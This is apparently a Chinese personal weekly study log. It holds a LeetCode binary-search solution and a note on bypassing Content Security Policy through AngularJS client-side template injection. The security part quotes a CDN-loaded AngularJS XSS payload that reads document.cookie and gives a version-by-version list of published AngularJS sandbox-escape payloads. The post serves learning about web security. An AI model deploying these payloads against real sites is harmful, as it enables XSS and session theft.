# Week02
# 算法题(Algorithm)

[题目: Search Insert Position](https://leetcode-cn.com/problems/search-insert-position/)
\#二分查找
这周继续巩固一下二分法

## 题目
给定一个排序数组和一个目标值，在数组中找到目标值，并返回其索引。如果目标值不存在于数组中，返回它将会被按顺序插入的位置。
你可以假设数组中无重复元素。

## 已知
0<= result <=len(nums)

## 二分法
同用week01使用一样的[原则](bear://x-callback-url/open-note?id=C15E3247-3E37-42EC-86AD-F506B55EECFE-23919-00001EBE8912C89B&header=%E4%BA%8C%E5%88%86%E6%B3%95)，这道题中最终插入的位置应该向上取整，所以最终代码如下；
```python
class Solution:
    def searchInsert(self, nums: List[int], target: int) -> int:
        """
        :type nums: List[int]
        :type target: int
        :rtype: int
        """
        max = len(nums)
        min = 0
        while max != min:
            mid = (max+min)>>1
            if nums[mid] < target:
                min = mid+1
            else:
                max = mid
        return int(max)
```

## 投机取巧
```python
class Solution:
    def searchInsert(self, nums, target):
        """
        :type nums: List[int]
        :type target: int
        :rtype: int
        """
        if target in nums:
            return nums.index(target)
        else:
            nums.append(target)
            nums.sort()
            return nums.index(target)
```
<br>

# 阅读点评(Review)

[XSS without HTML: Client-Side Template Injection with AngularJS](https://portswigger.net/blog/xss-without-html-client-side-template-injection-with-angularjs)
应用这个技巧可以绕过CSP，详见下方Tip。
<br>

# 技术技巧(Tip)
顾名思义，这个规范与内容安全有关，主要是用来定义页面可以加载哪些资源，减少 XSS 的发生。
CSP协议文档：[Content Security Policy (CSP) - Google Chrome](https://developer.chrome.com/extensions/contentSecurityPolicy) [https://developer.mozilla.org/zh-CN/docs/Web/Security/CSP/CSP_policy_directives](https://developer.mozilla.org/zh-CN/docs/Web/Security/CSP/CSP_policy_directives) 
浏览器兼容性： [CanIUse](http://caniuse.com/#feat=contentsecuritypolicy) 
好文：[Content Security Policy 介绍 | JerryQu 的小站](https://imququ.com/post/content-security-policy-reference.html) [知乎阿里云安全的回答](https://www.zhihu.com/question/21979782/answer/122682029)

## 攻击点
### unsafe关键字
`'unsafe-eval'`：允许使用eval()等通过字符串创建代码的方法。两侧单引号是必须的。*注意:*使用 ‘unsafe-inline’ 和 ‘unsafe-eval’ 都是不安全的，它们会使您的网站有跨站脚本攻击风险。

若使用了`unsafe-eval`关键字 -> 第一個想到在 2017 年 Black Hat USA 由幾個 Google Security 成員所發表的 [Breaking XSS mitigations via Script Gadgets](https://www.blackhat.com/docs/us-17/thursday/us-17-Lekies-Dont-Trust-The-DOM-Bypassing-XSS-Mitigations-Via-Script-Gadgets.pdf) 手法!
[file:18A50134-2F57-4A44-AF8D-D6C413329EB0-6533-000016A658FEBBDA/us-17-Lekies-Dont-Trust-The-DOM-Bypassing-XSS-Mitigations-Via-Script-Gadgets.pdf]

### 不安全的CDN
有些内容交付网络（CDN）JavaScript hosting 服務上提供了許多第三方函示庫以供引入，这时它就会让绕过CSP策略非常简单：可以直接使用 AngularJS 函示庫，配合 [Client-Side Template Injection](https://portswigger.net/blog/xss-without-html-client-side-template-injection-with-angularjs) 的方式輕鬆繞過!
如orange师傅在[blog](http://blog.orange.tw/2019/03/a-wormable-xss-on-hackmd.html)中利用逃逸注释标签加angularjs逃逸的payload：
```
<!-- foo="-->
<script src=https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.8/angular.min.js>
</script>
<div ng-app>
    {{constructor.constructor('alert(document.cookie)')()}}
</div>
//sssss" -->
``` 

附录：全angularjs版本利用方法
```
List of Sandbox bypasses
1.0.1 - 1.1.5
 [Mario Heiderich](https://twitter.com/cure53berlin) (Cure53)
{{constructor.constructor('alert(1)')()}}
1.2.0 - 1.2.1
 [Jan Horn](https://twitter.com/tehjh) (Google)
{{a='constructor';b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'alert(1)')()}}
1.2.2 - 1.2.5
 [Gareth Heyes](https://twitter.com/garethheyes) (PortSwigger)
{{'a'[{toString:[].join,length:1,0:'__proto__'}].charAt=''.valueOf;$eval("x='"+(y='if(!window\\u002ex)alert(window\\u002ex=1)')+eval(y)+"'");}}
1.2.6 - 1.2.18
 [Jan Horn](https://twitter.com/tehjh) (Google)
{{(_=''.sub).call.call({}[$='constructor'].getOwnPropertyDescriptor(_.__proto__,$).value,0,'alert(1)')()}}
1.2.19 - 1.2.23
 [Mathias Karlsson](https://twitter.com/avlidienbrunn) 
{{toString.constructor.prototype.toString=toString.constructor.prototype.call;["a","alert(1)"].sort(toString.constructor);}}
1.2.24 - 1.2.29
 [Gareth Heyes](https://twitter.com/garethheyes) (PortSwigger)
{{'a'.constructor.prototype.charAt=''.valueOf;$eval("x='\"+(y='if(!window\\u002ex)alert(window\\u002ex=1)')+eval(y)+\"'");}}
1.3.0
 [Gábor Molnár](https://twitter.com/molnar_g) (Google)
{{!ready && (ready = true) && (
      !call
      ? $$watchers[0].get(toString.constructor.prototype)
      : (a = apply) &&
        (apply = constructor) &&
        (valueOf = call) &&
        (''+''.toString(
          'F = Function.prototype;' +
          'F.apply = F.a;' +
          'delete F.a;' +
          'delete F.valueOf;' +
          'alert(1);'
        ))
    );}}
1.3.1 - 1.3.2
 [Gareth Heyes](https://twitter.com/garethheyes) (PortSwigger)
{{
    {}[{toString:[].join,length:1,0:'__proto__'}].assign=[].join;
    'a'.constructor.prototype.charAt=''.valueOf; 
    $eval('x=alert(1)//'); 
}}
1.3.3 - 1.3.18
 [Gareth Heyes](https://twitter.com/garethheyes) (PortSwigger)
{{{}[{toString:[].join,length:1,0:'__proto__'}].assign=[].join; 

  'a'.constructor.prototype.charAt=[].join;
  $eval('x=alert(1)//');  }}
1.3.19
 [Gareth Heyes](https://twitter.com/garethheyes) (PortSwigger)
{{
    'a'[{toString:false,valueOf:[].join,length:1,0:'__proto__'}].charAt=[].join; 
    $eval('x=alert(1)//'); 
}}
1.3.20
 [Gareth Heyes](https://twitter.com/garethheyes) (PortSwigger)
{{'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)');}}
1.4.0 - 1.4.9
 [Gareth Heyes](https://twitter.com/garethheyes) (PortSwigger)
{{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//');}}
1.5.0 - 1.5.8
 [Ian Hickey](https://twitter.com/ianhickey1024) 
{{x = {'y':''.constructor.prototype}; x['y'].charAt=[].join;$eval('x=alert(1)');}} 
1.5.9 - 1.5.11
 [Jan Horn](https://twitter.com/tehjh) (Google)
{{
 c=''.sub.call;b=''.sub.bind;a=''.sub.apply;
 c.$apply=$apply;c.$eval=b;op=$root.$$phase;
 $root.$$phase=null;od=$root.$digest;$root.$digest=({}).toString;
 C=c.$apply(c);$root.$$phase=op;$root.$digest=od;
 B=C(b,c,b);$evalAsync("
 astNode=pop();astNode.type='UnaryExpression';
 astNode.operator='(window.X?void0:(window.X=true,alert(1)))+';
 astNode.argument={type:'Identifier',name:'foo'};
 ");
 m1=B($$asyncQueue.pop().expression,null,$root);
 m2=B(C,null,m1);[].push.apply=m2;a=''.sub;
 $eval('a(b.c)');[].push.apply=a;
}}
>=1.6.0
 [Mario Heiderich](https://twitter.com/cure53berlin) (Cure53)
{{constructor.constructor('alert(1)')()}}
```
<br>

# 分享(Share)
我关于XSS的理论知识清单：https://hducaiji.github.io/2019/04/28/XSS/


